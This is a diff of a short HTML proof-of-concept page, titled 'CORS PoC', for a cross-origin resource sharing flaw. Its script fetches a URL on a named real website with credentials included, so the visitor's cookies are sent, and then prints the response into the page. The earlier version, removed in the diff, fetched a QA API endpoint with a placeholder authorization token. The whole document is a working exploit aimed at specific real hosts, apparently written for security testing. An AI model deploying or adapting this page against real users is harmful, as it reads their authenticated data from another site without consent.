@@ -1,15 +1,17 @@
+<!DOCTYPE html>
 <html>
 <body>
-<h2>PoC Test Page</h2>
+<h2>CORS PoC</h2>
 
 <script>
-fetch("https://platform-qa.dsilo.ai/data-service/api/v1/pd/62444add4786d2447b5a0c93",{
-headers:{
-"Authorization":"TOKEN"
-}
+fetch("https://www.tucows.com/haqt6iy0yx2eNjI3ZTgwNmVhYmRmYTBhYmFiOTY3MjU5/ag/g/c", {
+    credentials: "include"
 })
-.then(r=>r.text())
-.then(d=>document.body.innerHTML=d)
+.then(res => res.text())
+.then(data => {
+    document.body.innerHTML += "<pre>" + data + "</pre>";
+})
+.catch(err => console.log(err));
 </script>
 
 </body>
